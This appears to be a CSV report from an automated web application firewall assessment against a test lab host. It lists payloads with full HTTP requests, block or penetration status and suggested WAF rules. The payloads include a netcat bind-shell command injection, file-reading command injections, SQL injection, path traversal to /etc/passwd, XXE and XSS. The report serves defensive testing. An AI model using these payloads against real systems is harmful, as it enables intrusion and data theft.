"Source","Timestamp","Attack Type","URL","Action","Method","Payload","Input Name","Risk","Display URL","Status","Sub Category","Mitigation","Previous Status","Redirected","Full Request","Platform","Database"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:15","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","nc -lvvp 4445 -e /bin/sh &","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03jl=nc -lvvp 4445 -e /bin/sh &","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:nc -lvvp 4445 -e /bin/sh &.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03jl=nc%20-lvvp%204445%20-e%20/bin/sh%20 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:15","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post",")%20waitfor%20delay%20'0:0:20'%20--","hidden","high","https://ekslabs.cymulatedev.com","blocked","MSSQL Injection","Create a WAF Security rule to block incoming requests that contains:)%20waitfor%20delay%20'0:0:20'%20--.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the MSSQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 71
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":"")%20waitfor%20delay%20'0:0:20'%20--""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:14","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i","password","high","https://ekslabs.cymulatedev.com","blocked","Oracle SQL Injection","Create a WAF Security rule to block incoming requests that contains:AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Oracle SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 372
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:14","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","' or 1=1 /*","hidden","high","https://ekslabs.cymulatedev.com","blocked","Passive SQL Injection","Create a WAF Security rule to block incoming requests that contains:' or 1=1 /*.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Passive SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 47
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""' or 1=1 /*""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:14","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/apache/logs/error.log","N/A","medium","https://ekslabs.cymulatedev.com/apache/logs/error.log","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:/apache/logs/error.log.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /apache/logs/error.log HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","linux","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:14","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","....//....//etc/passwd","N/A","medium","https://ekslabs.cymulatedev.com?eq071lcfx03jk=....//....//etc/passwd","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:....//....//etc/passwd.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /?eq071lcfx03jk=....//....//etc/passwd HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","linux","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:14","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post",",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--","tel","high","https://ekslabs.cymulatedev.com","blocked","MSSQL Injection","Create a WAF Security rule to block incoming requests that contains:,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the MSSQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 458
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*\n,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:13","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","; ls -l /","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03jj=; ls -l /","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:; ls -l /.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03jj=;%20ls%20-l%20/ HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:13","XML Injections","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""<file:///etc/passwd>"" >]>'&xxe;'","tel","high","https://ekslabs.cymulatedev.com","blocked","XML External Entity (XXE)","Create a WAF Security rule to block incoming requests that contains:<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""<file:///etc/passwd>"" >]>'&xxe;'.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the XML External Entity (XXE) signature pack (XML Injections)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 429
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""<?xml version=\""1.0\"" encoding=\""ISO-8859-1\""?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \""<file:///etc/passwd>\"" >]>'&xxe;'"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:13","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","&lt;IMG SRC=`javascript:alert(""Kerala Cyber Force says, 'X'"")`&gt;","tel","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:&lt;IMG SRC=`javascript:alert(""Kerala Cyber Force says, 'X'"")`&gt;.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 360
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""&lt;IMG SRC=`javascript:alert(\""Kerala Cyber Force says, 'X'\"")`&gt;"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:13","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i","password","high","https://ekslabs.cymulatedev.com","blocked","Generic SQL Injection","Create a WAF Security rule to block incoming requests that contains:' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 374
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:12","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","""><img src=""x:ö"" title=""onerror=alert(1)//"">","password","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:""><img src=""x:ö"" title=""onerror=alert(1)//"">.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 342
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""\""><img src=\""x:ö\"" title=\""onerror=alert(1)//\"">"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:12","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","'><div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>​","password","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:'><div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>​.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 425
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""'><div  style=\""position:absolute;top:0;left:0;width:100%;height:100%\""  onmouseover=\""prompt(1)\"" onclick=\""alert(1)\"">x</button>​"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:12","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","eval(""s=document.createElement('script');alert(1);document.getElementsByTagName('head')[0].appendChild(s)"")","tel","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:eval(""s=document.createElement('script');alert(1);document.getElementsByTagName('head')[0].appendChild(s)"").
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 401
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""eval(\""s=document.createElement('script');alert(1);document.getElementsByTagName('head')[0].appendChild(s)\"")"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:12","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","$(`type C:oot.ini`)","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03ji=$(`type C:oot.ini`)","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:$(`type C:oot.ini`).
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03ji=$(`type%20C:%08oot.ini`) HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
